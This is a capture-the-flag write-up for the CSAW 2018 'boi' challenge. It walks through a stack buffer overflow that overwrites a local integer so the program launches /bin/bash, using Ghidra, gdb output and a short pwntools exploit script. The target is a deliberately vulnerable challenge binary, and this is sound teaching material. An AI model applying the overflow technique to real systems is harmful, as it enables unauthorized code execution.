# Csaw 2018 Quals Boi

notes from [guyinatuxedo](https://guyinatuxedo.github.io/04-bof_variable/csaw18_boi/index.html)

First grab the binary:
```
wget -O boi https://github.com/osirislab/CSAW-CTF-2018-Quals/blob/master/pwn/bigboy/boi?raw=true
chmod +x boi
```

Take a look at it:
```
$	file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
$	 pwn checksec boi
[*] '/root/github/binary-exploitation/stack-buffer-overflows/csaw-2018/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	 ./boi
Are you a big boiiiii??
12345678
Tue 26 May 2020 07:00:26 PM CDT
```

We are dealing with a 64-bit binary with a Stack Canary and Non-Executable stack.
Let's look at the main function in ghidra:
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined4 uStack40;
  int target;
  undefined4 local_20;
  long stackCanary;
  
  stackCanary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  local_20 = 0;
  uStack40 = 0;
  target = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&input,0x18);
  if (target == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (stackCanary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

It prints the string "Are you a big boiiiii??" with puts. Then it scans in ```0x18``` into input. ```target``` is initialized before the read call, comparing the value after the read call. The decompiled code shows us the constants it is assigned and compared to as *signed* integers, but looking at the assembly code we can see *unsigned* hex integers into input.

```asm
        0040067e c7 45 e4        MOV        dword ptr [RBP + target],0xdeadbeef
                 ef be ad de
```

We can also see the value that is being compared to is ```0xcaf3baee```:
```asm
        004006a5 8b 45 e4        MOV        EAX,dword ptr [RBP + target]
        004006a8 3d ee ba        CMP        EAX,0xcaf3baee
                 f3 ca
```

Now we look at the stack layout to see ```input``` can reach:
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 stackCanary                             XREF[2]:     00400659(W), 
                                                                                                   004006ca(R)  
             undefined4        Stack[-0x20]:4 local_20                                XREF[1]:     00400677(W)  
             undefined4        Stack[-0x24]:4 target                                  XREF[2]:     0040067e(W), 
                                                                                                   004006a5(R)  
             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)  
             undefined8        Stack[-0x38]:8 input                                   XREF[2]:     0040065f(W), 
                                                                                                   0040068f(*)  
             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)  
             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)  
                             main                                            XREF[5]:     Entry Point(*), 
                                                                                          _start:0040054d(*), 
                                                                                          _start:0040054d(*), 004007b4, 
                                                                                          00400868(*)  
        00400641 55              PUSH       RBP
```

We see that the input is stored at offset ```-0x38```. We can see that the target is stored at offset ```-0c24```. This means there is a ```0x14``` byte difference between the two values. Since we can write ```0x18``` bytes, which is 4 more than ```0x14```, we can overwrite 4 bytes. 

We set a breakpoint for directly after the ```read``` call using gdb.

We get the address of the read call from ghidra:
```
        004006a0 e8 5b fe        CALL       read                                             ssize_t read(int __fd, void * __
                 ff ff
        004006a5 8b 45 e4        MOV        EAX,dword ptr [RBP + target]
```

Now in gdb we can set the breakpoint and run
```
gef➤  b *0x004006a5
Breakpoint 1 at 0x4006a5
gef➤  r
Starting program: /root/github/binary-exploitation/stack-buffer-overflows/csaw-2018/boi
Are you a big boiiiii??
15935728

Breakpoint 1, 0x00000000004006a5 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x9
$rbx   : 0x0
$rcx   : 0x00007ffff7ede59e  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x18
$rsp   : 0x00007fffffffe630  →  0x00007fffffffe758  →  0x00007fffffffea45  →  "/root/github/binary-exploitation/stack-buffer-over[...]"
$rbp   : 0x00007fffffffe670  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffe640  →  "15935728\n"
$rdi   : 0x0
$rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x18
$r9    : 0x40
$r10   : 0xfffffffffffff3cd
$r11   : 0x246
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe750  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe630│+0x0000: 0x00007fffffffe758  →  0x00007fffffffea45  →  "/root/github/binary-exploitation/stack-buffer-over[...]"      ← $rsp
0x00007fffffffe638│+0x0008: 0x000000010040072d
0x00007fffffffe640│+0x0010: "15935728\n"         ← $rsi
0x00007fffffffe648│+0x0018: 0x000000000000000a
0x00007fffffffe650│+0x0020: 0xdeadbeef00000000
0x00007fffffffe658│+0x0028: 0x0000000000000000
0x00007fffffffe660│+0x0030: 0x00007fffffffe750  →  0x0000000000000001
0x00007fffffffe668│+0x0038: 0x68d94de24ac9ec00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 →   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a5 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

We can see out input ```15935728``` is ```0x14``` bytes away. When we give the input ```00000000000000000000``` + p32(```0xcaf3baee```), we need the hex address to be in little endian because that is how the elf will read the data.

```
python -c 'print "0"*0x14 + "\xee\xba\xf3\xca"' > input
```

```
gef➤  b *0x4006a5
Breakpoint 1 at 0x4006a5
gef➤  r < input
Starting program: /root/github/binary-exploitation/stack-buffer-overflows/csaw-2018/boi < input
Are you a big boiiiii??

Breakpoint 1, 0x00000000004006a5 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x18
$rbx   : 0x0
$rcx   : 0x00007ffff7ede59e  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x18
$rsp   : 0x00007fffffffe630  →  0x00007fffffffe758  →  0x00007fffffffea45  →  "/root/github/binary-exploitation/stack-buffer-over[...]"
$rbp   : 0x00007fffffffe670  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffe640  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x0
$rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
$r8    : 0x18
$r9    : 0x40
$r10   : 0xfffffffffffff3cd
$r11   : 0x246
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe750  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe630│+0x0000: 0x00007fffffffe758  →  0x00007fffffffea45  →  "/root/github/binary-exploitation/stack-buffer-over[...]"      ← $rsp
0x00007fffffffe638│+0x0008: 0x000000010040072d
0x00007fffffffe640│+0x0010: 0x3030303030303030   ← $rsi
0x00007fffffffe648│+0x0018: 0x3030303030303030
0x00007fffffffe650│+0x0020: 0xcaf3baee30303030
0x00007fffffffe658│+0x0028: 0x0000000000000000
0x00007fffffffe660│+0x0030: 0x00007fffffffe750  →  0x0000000000000001
0x00007fffffffe668│+0x0038: 0x0145804cd70c1600
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400698 <main+87>        mov    rsi, rax
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
 →   0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
     0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a5 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a5 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
We can see that we have overwritten the integer with the value ```0xcaf3baee```:
```
gef➤  search-pattern 0000000000
[+] Searching '0000000000' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.30.so'(0x7ffff7f5f000-0x7ffff7fa9000), permission=r--
  0x7ffff7f7f870 - 0x7ffff7f7f880  →   "0000000000000000" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe640 - 0x7fffffffe64a  →   "0000000000[...]" 
  0x7fffffffe64a - 0x7fffffffe654  →   "0000000000[...]" 
gef➤  x/10g 0x7fffffffe640
0x7fffffffe640: 0x3030303030303030      0x3030303030303030
0x7fffffffe650: 0xcaf3baee30303030      0x0
0x7fffffffe660: 0x7fffffffe750  0x145804cd70c1600
0x7fffffffe670: 0x4006e0        0x7ffff7e16e0b
0x7fffffffe680: 0x0     0x7fffffffe758
gef➤  
```
When we continue to the ```cmp``` intruction, we see that it will pass the check:

```
gef➤  b *0x4006a8
Breakpoint 2 at 0x4006a8
gef➤  c
Continuing.

Breakpoint 2, 0x00000000004006a8 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xcaf3baee
$rbx   : 0x0
$rcx   : 0x00007ffff7ede59e  →  0x5a77fffff0003d48 ("H="?)
$rdx   : 0x18
$rsp   : 0x00007fffffffe630  →  0x00007fffffffe758  →  0x00007fffffffea45  →  "/root/github/binary-exploitation/stack-buffer-over[...]"
$rbp   : 0x00007fffffffe670  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffe640  →  0x3030303030303030 ("00000000"?)
$rdi   : 0x0
$rip   : 0x00000000004006a8  →  <main+103> cmp eax, 0xcaf3baee
$r8    : 0x18
$r9    : 0x40
$r10   : 0xfffffffffffff3cd
$r11   : 0x246
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe750  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe630│+0x0000: 0x00007fffffffe758  →  0x00007fffffffea45  →  "/root/github/binary-exploitation/stack-buffer-over[...]"      ← $rsp
0x00007fffffffe638│+0x0008: 0x000000010040072d
0x00007fffffffe640│+0x0010: 0x3030303030303030   ← $rsi
0x00007fffffffe648│+0x0018: 0x3030303030303030
0x00007fffffffe650│+0x0020: 0xcaf3baee30303030
0x00007fffffffe658│+0x0028: 0x0000000000000000
0x00007fffffffe660│+0x0030: 0x00007fffffffe750  →  0x0000000000000001
0x00007fffffffe668│+0x0038: 0x0145804cd70c1600
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40069b <main+90>        mov    edi, 0x0
     0x4006a0 <main+95>        call   0x400500 <read@plt>
     0x4006a5 <main+100>       mov    eax, DWORD PTR [rbp-0x1c]
 →   0x4006a8 <main+103>       cmp    eax, 0xcaf3baee
     0x4006ad <main+108>       jne    0x4006bb <main+122>
     0x4006af <main+110>       mov    edi, 0x40077c
     0x4006b4 <main+115>       call   0x400626 <run_cmd>
     0x4006b9 <main+120>       jmp    0x4006c5 <main+132>
     0x4006bb <main+122>       mov    edi, 0x400786
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a8 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a8 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $eax
$1 = 0xcaf3baee
gef➤
```

Now we can write the exploit
```python
#!/usr/bin/python

# import pwntools
from pwn import *

# establish target process
target = process('./boi')

# make the payload
# 0x14 bytes of filler to fill the gap between 
# start and target int
# 0x4 byte int we will overwrite target with
payload = "0"*0x14 + p32(0xcaf3baee)

# send payload
target.send(payload)

# drop to interactive shell 
target.interactive()
```

We run the exploit
```
$	python boi-exploit.py 
[+] Starting local process './boi': pid 644123
[*] Switching to interactive mode
Are you a big boiiiii??
$ ls
boi  boi-exploit.py  csaw-2018-boi.md  input
$ whoami
root
$  
```
